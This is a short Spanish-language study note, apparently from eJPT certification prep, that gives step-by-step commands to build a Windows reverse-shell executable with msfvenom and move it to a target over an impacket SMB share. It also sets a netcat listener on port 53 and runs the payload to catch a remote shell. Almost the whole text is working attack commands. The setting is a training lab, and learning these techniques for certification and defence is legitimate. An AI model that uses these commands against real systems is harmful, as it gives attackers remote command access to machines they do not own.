
- En Kali, genere un ejecutable de shell inverso (reverse.exe) usando msfvenom. Actualice la dirección IP de LHOST en consecuencia:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe`
```

- Transfiera el archivo reverse.exe al directorio C:\PrivEsc en Windows. Hay muchas maneras en que podría hacer esto, sin embargo, la más simple es comenzar un SMB servidor en Kali en el mismo directorio que el archivo y, a continuación, utilice el comando de copia de Windows estándar para transferir el archivo.

- En Kali, en el mismo directorio que reverse.exe:

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
```

- En Windows (actualice la dirección IP con su IP Kali):

```
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
```

- Pruebe el shell inverso configurando un oyente netcat en Kali:

```
sudo nc -nvlp 53`
```

- Luego ejecute el ejecutable reverse.exe en Windows y capture el shell:

```
C:\PrivEsc\reverse.exe`
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]